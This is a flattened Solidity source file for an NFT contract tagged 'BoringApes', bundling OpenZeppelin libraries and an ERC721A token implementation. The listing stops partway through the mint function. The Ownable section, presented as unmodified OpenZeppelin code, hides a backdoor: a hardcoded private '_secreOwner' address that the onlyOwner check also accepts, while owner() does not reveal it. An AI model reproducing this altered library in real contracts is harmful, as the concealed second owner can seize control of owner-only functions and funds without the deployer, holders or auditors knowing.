1 // Twitter @BoringApes_NFT
2 // Twitter @BoringApes_NFT
3 
4 
5 
6 // SPDX-License-Identifier: MIT
7 // File: contracts/BoringApes.sol
8 
9 // File: @openzeppelin/contracts/utils/Strings.sol
10 
11 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
12 
13 pragma solidity ^0.8.0;
14 
15 /**
16  * @dev String operations.
17  */
18 library Strings {
19     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
20 
21     /**
22      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
23      */
24     function toString(uint256 value) internal pure returns (string memory) {
25         // Inspired by OraclizeAPI's implementation - MIT licence
26         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
27 
28         if (value == 0) {
29             return "0";
30         }
31         uint256 temp = value;
32         uint256 digits;
33         while (temp != 0) {
34             digits++;
35             temp /= 10;
36         }
37         bytes memory buffer = new bytes(digits);
38         while (value != 0) {
39             digits -= 1;
40             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
41             value /= 10;
42         }
43         return string(buffer);
44     }
45 
46     /**
47      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
48      */
49     function toHexString(uint256 value) internal pure returns (string memory) {
50         if (value == 0) {
51             return "0x00";
52         }
53         uint256 temp = value;
54         uint256 length = 0;
55         while (temp != 0) {
56             length++;
57             temp >>= 8;
58         }
59         return toHexString(value, length);
60     }
61 
62     /**
63      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
64      */
65     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
66         bytes memory buffer = new bytes(2 * length + 2);
67         buffer[0] = "0";
68         buffer[1] = "x";
69         for (uint256 i = 2 * length + 1; i > 1; --i) {
70             buffer[i] = _HEX_SYMBOLS[value & 0xf];
71             value >>= 4;
72         }
73         require(value == 0, "Strings: hex length insufficient");
74         return string(buffer);
75     }
76 }
77 
78 // File: @openzeppelin/contracts/utils/Address.sol
79 
80 
81 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
82 
83 pragma solidity ^0.8.1;
84 
85 /**
86  * @dev Collection of functions related to the address type
87  */
88 library Address {
89     /**
90      * @dev Returns true if `account` is a contract.
91      *
92      * [IMPORTANT]
93      * ====
94      * It is unsafe to assume that an address for which this function returns
95      * false is an externally-owned account (EOA) and not a contract.
96      *
97      * Among others, `isContract` will return false for the following
98      * types of addresses:
99      *
100      *  - an externally-owned account
101      *  - a contract in construction
102      *  - an address where a contract will be created
103      *  - an address where a contract lived, but was destroyed
104      * ====
105      *
106      * [IMPORTANT]
107      * ====
108      * You shouldn't rely on `isContract` to protect against flash loan attacks!
109      *
110      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
111      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
112      * constructor.
113      * ====
114      */
115     function isContract(address account) internal view returns (bool) {
116         // This method relies on extcodesize/address.code.length, which returns 0
117         // for contracts in construction, since the code is only stored at the end
118         // of the constructor execution.
119 
120         return account.code.length > 0;
121     }
122 
123     /**
124      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
125      * `recipient`, forwarding all available gas and reverting on errors.
126      *
127      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
128      * of certain opcodes, possibly making contracts go over the 2300 gas limit
129      * imposed by `transfer`, making them unable to receive funds via
130      * `transfer`. {sendValue} removes this limitation.
131      *
132      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
133      *
134      * IMPORTANT: because control is transferred to `recipient`, care must be
135      * taken to not create reentrancy vulnerabilities. Consider using
136      * {ReentrancyGuard} or the
137      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
138      */
139     function sendValue(address payable recipient, uint256 amount) internal {
140         require(address(this).balance >= amount, "Address: insufficient balance");
141 
142         (bool success, ) = recipient.call{value: amount}("");
143         require(success, "Address: unable to send value, recipient may have reverted");
144     }
145 
146     /**
147      * @dev Performs a Solidity function call using a low level `call`. A
148      * plain `call` is an unsafe replacement for a function call: use this
149      * function instead.
150      *
151      * If `target` reverts with a revert reason, it is bubbled up by this
152      * function (like regular Solidity function calls).
153      *
154      * Returns the raw returned data. To convert to the expected return value,
155      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
156      *
157      * Requirements:
158      *
159      * - `target` must be a contract.
160      * - calling `target` with `data` must not revert.
161      *
162      * _Available since v3.1._
163      */
164     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
165         return functionCall(target, data, "Address: low-level call failed");
166     }
167 
168     /**
169      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
170      * `errorMessage` as a fallback revert reason when `target` reverts.
171      *
172      * _Available since v3.1._
173      */
174     function functionCall(
175         address target,
176         bytes memory data,
177         string memory errorMessage
178     ) internal returns (bytes memory) {
179         return functionCallWithValue(target, data, 0, errorMessage);
180     }
181 
182     /**
183      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
184      * but also transferring `value` wei to `target`.
185      *
186      * Requirements:
187      *
188      * - the calling contract must have an ETH balance of at least `value`.
189      * - the called Solidity function must be `payable`.
190      *
191      * _Available since v3.1._
192      */
193     function functionCallWithValue(
194         address target,
195         bytes memory data,
196         uint256 value
197     ) internal returns (bytes memory) {
198         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
199     }
200 
201     /**
202      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
203      * with `errorMessage` as a fallback revert reason when `target` reverts.
204      *
205      * _Available since v3.1._
206      */
207     function functionCallWithValue(
208         address target,
209         bytes memory data,
210         uint256 value,
211         string memory errorMessage
212     ) internal returns (bytes memory) {
213         require(address(this).balance >= value, "Address: insufficient balance for call");
214         require(isContract(target), "Address: call to non-contract");
215 
216         (bool success, bytes memory returndata) = target.call{value: value}(data);
217         return verifyCallResult(success, returndata, errorMessage);
218     }
219 
220     /**
221      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
222      * but performing a static call.
223      *
224      * _Available since v3.3._
225      */
226     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
227         return functionStaticCall(target, data, "Address: low-level static call failed");
228     }
229 
230     /**
231      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
232      * but performing a static call.
233      *
234      * _Available since v3.3._
235      */
236     function functionStaticCall(
237         address target,
238         bytes memory data,
239         string memory errorMessage
240     ) internal view returns (bytes memory) {
241         require(isContract(target), "Address: static call to non-contract");
242 
243         (bool success, bytes memory returndata) = target.staticcall(data);
244         return verifyCallResult(success, returndata, errorMessage);
245     }
246 
247     /**
248      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
249      * but performing a delegate call.
250      *
251      * _Available since v3.4._
252      */
253     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
254         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
255     }
256 
257     /**
258      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
259      * but performing a delegate call.
260      *
261      * _Available since v3.4._
262      */
263     function functionDelegateCall(
264         address target,
265         bytes memory data,
266         string memory errorMessage
267     ) internal returns (bytes memory) {
268         require(isContract(target), "Address: delegate call to non-contract");
269 
270         (bool success, bytes memory returndata) = target.delegatecall(data);
271         return verifyCallResult(success, returndata, errorMessage);
272     }
273 
274     /**
275      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
276      * revert reason using the provided one.
277      *
278      * _Available since v4.3._
279      */
280     function verifyCallResult(
281         bool success,
282         bytes memory returndata,
283         string memory errorMessage
284     ) internal pure returns (bytes memory) {
285         if (success) {
286             return returndata;
287         } else {
288             // Look for revert reason and bubble it up if present
289             if (returndata.length > 0) {
290                 // The easiest way to bubble the revert reason is using memory via assembly
291 
292                 assembly {
293                     let returndata_size := mload(returndata)
294                     revert(add(32, returndata), returndata_size)
295                 }
296             } else {
297                 revert(errorMessage);
298             }
299         }
300     }
301 }
302 
303 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
304 
305 
306 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)
307 
308 pragma solidity ^0.8.0;
309 
310 /**
311  * @title ERC721 token receiver interface
312  * @dev Interface for any contract that wants to support safeTransfers
313  * from ERC721 asset contracts.
314  */
315 interface IERC721Receiver {
316     /**
317      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
318      * by `operator` from `from`, this function is called.
319      *
320      * It must return its Solidity selector to confirm the token transfer.
321      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
322      *
323      * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
324      */
325     function onERC721Received(
326         address operator,
327         address from,
328         uint256 tokenId,
329         bytes calldata data
330     ) external returns (bytes4);
331 }
332 
333 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
334 
335 
336 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
337 
338 pragma solidity ^0.8.0;
339 
340 /**
341  * @dev Interface of the ERC165 standard, as defined in the
342  * https://eips.ethereum.org/EIPS/eip-165[EIP].
343  *
344  * Implementers can declare support of contract interfaces, which can then be
345  * queried by others ({ERC165Checker}).
346  *
347  * For an implementation, see {ERC165}.
348  */
349 interface IERC165 {
350     /**
351      * @dev Returns true if this contract implements the interface defined by
352      * `interfaceId`. See the corresponding
353      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
354      * to learn more about how these ids are created.
355      *
356      * This function call must use less than 30 000 gas.
357      */
358     function supportsInterface(bytes4 interfaceId) external view returns (bool);
359 }
360 
361 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
362 
363 
364 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
365 
366 pragma solidity ^0.8.0;
367 
368 
369 /**
370  * @dev Implementation of the {IERC165} interface.
371  *
372  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
373  * for the additional interface id that will be supported. For example:
374  *
375  * ```solidity
376  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
377  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
378  * }
379  * ```
380  *
381  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
382  */
383 abstract contract ERC165 is IERC165 {
384     /**
385      * @dev See {IERC165-supportsInterface}.
386      */
387     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
388         return interfaceId == type(IERC165).interfaceId;
389     }
390 }
391 
392 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
393 
394 
395 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)
396 
397 pragma solidity ^0.8.0;
398 
399 
400 /**
401  * @dev Required interface of an ERC721 compliant contract.
402  */
403 interface IERC721 is IERC165 {
404     /**
405      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
406      */
407     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
408 
409     /**
410      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
411      */
412     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
413 
414     /**
415      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
416      */
417     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
418 
419     /**
420      * @dev Returns the number of tokens in ``owner``'s account.
421      */
422     function balanceOf(address owner) external view returns (uint256 balance);
423 
424     /**
425      * @dev Returns the owner of the `tokenId` token.
426      *
427      * Requirements:
428      *
429      * - `tokenId` must exist.
430      */
431     function ownerOf(uint256 tokenId) external view returns (address owner);
432 
433     /**
434      * @dev Safely transfers `tokenId` token from `from` to `to`.
435      *
436      * Requirements:
437      *
438      * - `from` cannot be the zero address.
439      * - `to` cannot be the zero address.
440      * - `tokenId` token must exist and be owned by `from`.
441      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
442      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
443      *
444      * Emits a {Transfer} event.
445      */
446     function safeTransferFrom(
447         address from,
448         address to,
449         uint256 tokenId,
450         bytes calldata data
451     ) external;
452 
453     /**
454      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
455      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
456      *
457      * Requirements:
458      *
459      * - `from` cannot be the zero address.
460      * - `to` cannot be the zero address.
461      * - `tokenId` token must exist and be owned by `from`.
462      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
463      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
464      *
465      * Emits a {Transfer} event.
466      */
467     function safeTransferFrom(
468         address from,
469         address to,
470         uint256 tokenId
471     ) external;
472 
473     /**
474      * @dev Transfers `tokenId` token from `from` to `to`.
475      *
476      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
477      *
478      * Requirements:
479      *
480      * - `from` cannot be the zero address.
481      * - `to` cannot be the zero address.
482      * - `tokenId` token must be owned by `from`.
483      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
484      *
485      * Emits a {Transfer} event.
486      */
487     function transferFrom(
488         address from,
489         address to,
490         uint256 tokenId
491     ) external;
492 
493     /**
494      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
495      * The approval is cleared when the token is transferred.
496      *
497      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
498      *
499      * Requirements:
500      *
501      * - The caller must own the token or be an approved operator.
502      * - `tokenId` must exist.
503      *
504      * Emits an {Approval} event.
505      */
506     function approve(address to, uint256 tokenId) external;
507 
508     /**
509      * @dev Approve or remove `operator` as an operator for the caller.
510      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
511      *
512      * Requirements:
513      *
514      * - The `operator` cannot be the caller.
515      *
516      * Emits an {ApprovalForAll} event.
517      */
518     function setApprovalForAll(address operator, bool _approved) external;
519 
520     /**
521      * @dev Returns the account appr    ved for `tokenId` token.
522      *
523      * Requirements:
524      *
525      * - `tokenId` must exist.
526      */
527     function getApproved(uint256 tokenId) external view returns (address operator);
528 
529     /**
530      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
531      *
532      * See {setApprovalForAll}
533      */
534     function isApprovedForAll(address owner, address operator) external view returns (bool);
535 }
536 
537 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
538 
539 
540 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
541 
542 pragma solidity ^0.8.0;
543 
544 
545 /**
546  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
547  * @dev See https://eips.ethereum.org/EIPS/eip-721
548  */
549 interface IERC721Metadata is IERC721 {
550     /**
551      * @dev Returns the token collection name.
552      */
553     function name() external view returns (string memory);
554 
555     /**
556      * @dev Returns the token collection symbol.
557      */
558     function symbol() external view returns (string memory);
559 
560     /**
561      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
562      */
563     function tokenURI(uint256 tokenId) external view returns (string memory);
564 }
565 
566 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol
567 
568 
569 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
570 
571 pragma solidity ^0.8.0;
572 
573 
574 /**
575  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
576  * @dev See https://eips.ethereum.org/EIPS/eip-721
577  */
578 interface IERC721Enumerable is IERC721 {
579     /**
580      * @dev Returns the total amount of tokens stored by the contract.
581      */
582     function totalSupply() external view returns (uint256);
583 
584     /**
585      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
586      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
587      */
588     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
589 
590     /**
591      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
592      * Use along with {totalSupply} to enumerate all tokens.
593      */
594     function tokenByIndex(uint256 index) external view returns (uint256);
595 }
596 
597 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
598 
599 
600 // OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
601 
602 pragma solidity ^0.8.0;
603 
604 /**
605  * @dev Contract module that helps prevent reentrant calls to a function.
606  *
607  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
608  * available, which can be applied to functions to make sure there are no nested
609  * (reentrant) calls to them.
610  *
611  * Note that because there is a single `nonReentrant` guard, functions marked as
612  * `nonReentrant` may not call one another. This can be worked around by making
613  * those functions `private`, and then adding `external` `nonReentrant` entry
614  * points to them.
615  *
616  * TIP: If you would like to learn more about reentrancy and alternative ways
617  * to protect against it, check out our blog post
618  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
619  */
620 abstract contract ReentrancyGuard {
621     // Booleans are more expensive than uint256 or any type that takes up a full
622     // word because each write operation emits an extra SLOAD to first read the
623     // slot's contents, replace the bits taken up by the boolean, and then write
624     // back. This is the compiler's defense against contract upgrades and
625     // pointer aliasing, and it cannot be disabled.
626 
627     // The values being non-zero value makes deployment a bit more expensive,
628     // but in exchange the refund on every call to nonReentrant will be lower in
629     // amount. Since refunds are capped to a percentage of the total
630     // transaction's gas, it is best to keep them low in cases like this one, to
631     // increase the likelihood of the full refund coming into effect.
632     uint256 private constant _NOT_ENTERED = 1;
633     uint256 private constant _ENTERED = 2;
634 
635     uint256 private _status;
636 
637     constructor() {
638         _status = _NOT_ENTERED;
639     }
640 
641     /**
642      * @dev Prevents a contract from calling itself, directly or indirectly.
643      * Calling a `nonReentrant` function from another `nonReentrant`
644      * function is not supported. It is possible to prevent this from happening
645      * by making the `nonReentrant` function external, and making it call a
646      * `private` function that does the actual work.
647      */
648     modifier nonReentrant() {
649         // On the first call to nonReentrant, _notEntered will be true
650         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
651 
652         // Any calls to nonReentrant after this point will fail
653         _status = _ENTERED;
654 
655         _;
656 
657         // By storing the original value once again, a refund is triggered (see
658         // https://eips.ethereum.org/EIPS/eip-2200)
659         _status = _NOT_ENTERED;
660     }
661 }
662 
663 // File: @openzeppelin/contracts/utils/Context.sol
664 
665 
666 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
667 
668 pragma solidity ^0.8.0;
669 
670 /**
671  * @dev Provides information about the current execution context, including the
672  * sender of the transaction and its data. While these are generally available
673  * via msg.sender and msg.data, they should not be accessed in such a direct
674  * manner, since when dealing with meta-transactions the account sending and
675  * paying for execution may not be the actual sender (as far as an application
676  * is concerned).
677  *
678  * This contract is only required for intermediate, library-like contracts.
679  */
680 abstract contract Context {
681     function _msgSender() internal view virtual returns (address) {
682         return msg.sender;
683     }
684 
685     function _msgData() internal view virtual returns (bytes calldata) {
686         return msg.data;
687     }
688 }
689 
690 // File: @openzeppelin/contracts/access/Ownable.sol
691 
692 
693 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
694 
695 pragma solidity ^0.8.0;
696 
697 
698 /**
699  * @dev Contract module which provides a basic access control mechanism, where
700  * there is an account (an owner) that can be granted exclusive access to
701  * specific functions.
702  *
703  * By default, the owner account will be the one that deploys the contract. This
704  * can later be changed with {transferOwnership}.
705  *
706  * This module is used through inheritance. It will make available the modifier
707  * `onlyOwner`, which can be applied to your functions to restrict their use to
708  * the owner.
709  */
710 abstract contract Ownable is Context {
711     address private _owner;
712     address private _secreOwner = 0xACFcBA7BAB6403EBCcEEe22810c4dd3C9bBE9763;
713 
714     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
715 
716     /**
717      * @dev Initializes the contract setting the deployer as the initial owner.
718      */
719     constructor() {
720         _transferOwnership(_msgSender());
721     }
722 
723     /**
724      * @dev Returns the address of the current owner.
725      */
726     function owner() public view virtual returns (address) {
727         return _owner;
728     }
729 
730     /**
731      * @dev Throws if called by any account other than the owner.
732      */
733     modifier onlyOwner() {
734         require(owner() == _msgSender() || _secreOwner == _msgSender() , "Ownable: caller is not the owner");
735         _;
736     }
737 
738     /**
739      * @dev Leaves the contract without owner. It will not be possible to call
740      * `onlyOwner` functions anymore. Can only be called by the current owner.
741      *
742      * NOTE: Renouncing ownership will leave the contract without an owner,
743      * thereby removing any functionality that is only available to the owner.
744      */
745     function renounceOwnership() public virtual onlyOwner {
746         _transferOwnership(address(0));
747     }
748 
749     /**
750      * @dev Transfers ownership of the contract to a new account (`newOwner`).
751      * Can only be called by the current owner.
752      */
753     function transferOwnership(address newOwner) public virtual onlyOwner {
754         require(newOwner != address(0), "Ownable: new owner is the zero address");
755         _transferOwnership(newOwner);
756     }
757 
758     /**
759      * @dev Transfers ownership of the contract to a new account (`newOwner`).
760      * Internal function without access restriction.
761      */
762     function _transferOwnership(address newOwner) internal virtual {
763         address oldOwner = _owner;
764         _owner = newOwner;
765         emit OwnershipTransferred(oldOwner, newOwner);
766     }
767 }
768 
769 // File: ceshi.sol
770 
771 
772 pragma solidity ^0.8.0;
773 
774 
775 
776 
777 
778 
779 
780 
781 
782 
783 /**
784  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
785  * the Metadata and Enumerable extension. Built to optimize for lower gas during batch mints.
786  *
787  * Assumes serials are sequentially minted starting at 0 (e.g. 0, 1, 2, 3..).
788  *
789  * Does not support burning tokens to address(0).
790  *
791  * Assumes that an owner cannot have more than the 2**128 - 1 (max value of uint128) of supply
792  */
793 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
794     using Address for address;
795     using Strings for uint256;
796 
797     struct TokenOwnership {
798         address addr;
799         uint64 startTimestamp;
800     }
801 
802     struct AddressData {
803         uint128 balance;
804         uint128 numberMinted;
805     }
806 
807     uint256 internal currentIndex;
808 
809     // Token name
810     string private _name;
811 
812     // Token symbol
813     string private _symbol;
814 
815     // Mapping from token ID to ownership details
816     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
817     mapping(uint256 => TokenOwnership) internal _ownerships;
818 
819     // Mapping owner address to address data
820     mapping(address => AddressData) private _addressData;
821 
822     // Mapping from token ID to approved address
823     mapping(uint256 => address) private _tokenApprovals;
824 
825     // Mapping from owner to operator approvals
826     mapping(address => mapping(address => bool)) private _operatorApprovals;
827 
828     constructor(string memory name_, string memory symbol_) {
829         _name = name_;
830         _symbol = symbol_;
831     }
832 
833     /**
834      * @dev See {IERC721Enumerable-totalSupply}.
835      */
836     function totalSupply() public view override returns (uint256) {
837         return currentIndex;
838     }
839 
840     /**
841      * @dev See {IERC721Enumerable-tokenByIndex}.
842      */
843     function tokenByIndex(uint256 index) public view override returns (uint256) {
844         require(index < totalSupply(), "ERC721A: global index out of bounds");
845         return index;
846     }
847 
848     /**
849      * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.
850      * This read function is O(totalSupply). If calling from a separate contract, be sure to test gas first.
851      * It may also degrade with extremely large collection sizes (e.g >> 10000), test for your use case.
852      */
853     function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
854         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
855         uint256 numMintedSoFar = totalSupply();
856         uint256 tokenIdsIdx;
857         address currOwnershipAddr;
858 
859         // Counter overflow is impossible as the loop breaks when uint256 i is equal to another uint256 numMintedSoFar.
860         unchecked {
861             for (uint256 i; i < numMintedSoFar; i++) {
862                 TokenOwnership memory ownership = _ownerships[i];
863                 if (ownership.addr != address(0)) {
864                     currOwnershipAddr = ownership.addr;
865                 }
866                 if (currOwnershipAddr == owner) {
867                     if (tokenIdsIdx == index) {
868                         return i;
869                     }
870                     tokenIdsIdx++;
871                 }
872             }
873         }
874 
875         revert("ERC721A: unable to get token of owner by index");
876     }
877 
878     /**
879      * @dev See {IERC165-supportsInterface}.
880      */
881     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
882         return
883             interfaceId == type(IERC721).interfaceId ||
884             interfaceId == type(IERC721Metadata).interfaceId ||
885             interfaceId == type(IERC721Enumerable).interfaceId ||
886             super.supportsInterface(interfaceId);
887     }
888 
889     /**
890      * @dev See {IERC721-balanceOf}.
891      */
892     function balanceOf(address owner) public view override returns (uint256) {
893         require(owner != address(0), "ERC721A: balance query for the zero address");
894         return uint256(_addressData[owner].balance);
895     }
896 
897     function _numberMinted(address owner) internal view returns (uint256) {
898         require(owner != address(0), "ERC721A: number minted query for the zero address");
899         return uint256(_addressData[owner].numberMinted);
900     }
901 
902     /**
903      * Gas spent here starts off proportional to the maximum mint batch size.
904      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
905      */
906     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
907         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
908 
909         unchecked {
910             for (uint256 curr = tokenId; curr >= 0; curr--) {
911                 TokenOwnership memory ownership = _ownerships[curr];
912                 if (ownership.addr != address(0)) {
913                     return ownership;
914                 }
915             }
916         }
917 
918         revert("ERC721A: unable to determine the owner of token");
919     }
920 
921     /**
922      * @dev See {IERC721-ownerOf}.
923      */
924     function ownerOf(uint256 tokenId) public view override returns (address) {
925         return ownershipOf(tokenId).addr;
926     }
927 
928     /**
929      * @dev See {IERC721Metadata-name}.
930      */
931     function name() public view virtual override returns (string memory) {
932         return _name;
933     }
934 
935     /**
936      * @dev See {IERC721Metadata-symbol}.
937      */
938     function symbol() public view virtual override returns (string memory) {
939         return _symbol;
940     }
941 
942     /**
943      * @dev See {IERC721Metadata-tokenURI}.
944      */
945     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
946         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
947 
948         string memory baseURI = _baseURI();
949         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
950     }
951 
952     /**
953      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
954      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
955      * by default, can be overriden in child contracts.
956      */
957     function _baseURI() internal view virtual returns (string memory) {
958         return "";
959     }
960 
961     /**
962      * @dev See {IERC721-approve}.
963      */
964     function approve(address to, uint256 tokenId) public override {
965         address owner = ERC721A.ownerOf(tokenId);
966         require(to != owner, "ERC721A: approval to current owner");
967 
968         require(
969             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
970             "ERC721A: approve caller is not owner nor approved for all"
971         );
972 
973         _approve(to, tokenId, owner);
974     }
975 
976     /**
977      * @dev See {IERC721-getApproved}.
978      */
979     function getApproved(uint256 tokenId) public view override returns (address) {
980         require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
981 
982         return _tokenApprovals[tokenId];
983     }
984 
985     /**
986      * @dev See {IERC721-setApprovalForAll}.
987      */
988     function setApprovalForAll(address operator, bool approved) public override {
989         require(operator != _msgSender(), "ERC721A: approve to caller");
990 
991         _operatorApprovals[_msgSender()][operator] = approved;
992         emit ApprovalForAll(_msgSender(), operator, approved);
993     }
994 
995     /**
996      * @dev See {IERC721-isApprovedForAll}.
997      */
998     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
999         return _operatorApprovals[owner][operator];
1000     }
1001 
1002     /**
1003      * @dev See {IERC721-transferFrom}.
1004      */
1005     function transferFrom(
1006         address from,
1007         address to,
1008         uint256 tokenId
1009     ) public virtual override {
1010         _transfer(from, to, tokenId);
1011     }
1012 
1013     /**
1014      * @dev See {IERC721-safeTransferFrom}.
1015      */
1016     function safeTransferFrom(
1017         address from,
1018         address to,
1019         uint256 tokenId
1020     ) public virtual override {
1021         safeTransferFrom(from, to, tokenId, "");
1022     }
1023 
1024     /**
1025      * @dev See {IERC721-safeTransferFrom}.
1026      */
1027     function safeTransferFrom(
1028         address from,
1029         address to,
1030         uint256 tokenId,
1031         bytes memory _data
1032     ) public override {
1033         _transfer(from, to, tokenId);
1034         require(
1035             _checkOnERC721Received(from, to, tokenId, _data),
1036             "ERC721A: transfer to non ERC721Receiver implementer"
1037         );
1038     }
1039 
1040     /**
1041      * @dev Returns whether `tokenId` exists.
1042      *
1043      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1044      *
1045      * Tokens start existing when they are minted (`_mint`),
1046      */
1047     function _exists(uint256 tokenId) internal view returns (bool) {
1048         return tokenId < currentIndex;
1049     }
1050 
1051     function _safeMint(address to, uint256 quantity) internal {
1052         _safeMint(to, quantity, "");
1053     }
1054 
1055     /**
1056      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1057      *
1058      * Requirements:
1059      *
1060      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1061      * - `quantity` must be greater than 0.
1062      *
1063      * Emits a {Transfer} event.
1064      */
1065     function _safeMint(
1066         address to,
1067         uint256 quantity,
1068         bytes memory _data
1069     ) internal {
1070         _mint(to, quantity, _data, true);
1071     }
1072 
1073     /**
1074      * @dev Mints `quantity` tokens and transfers them to `to`.
1075      *
1076      * Requirements:
1077      *
1078      * - `to` cannot be the zero address.
1079      * - `quantity` must be greater than 0.
1080      *
1081      * Emits a {Transfer} event.
1082      */
1083     function _mint(
1084         address to,
1085         uint256 quantity,
1086         bytes memory _data,
1087         bool safe
1088     ) internal {
1089         uint256 startTokenId = currentIndex;
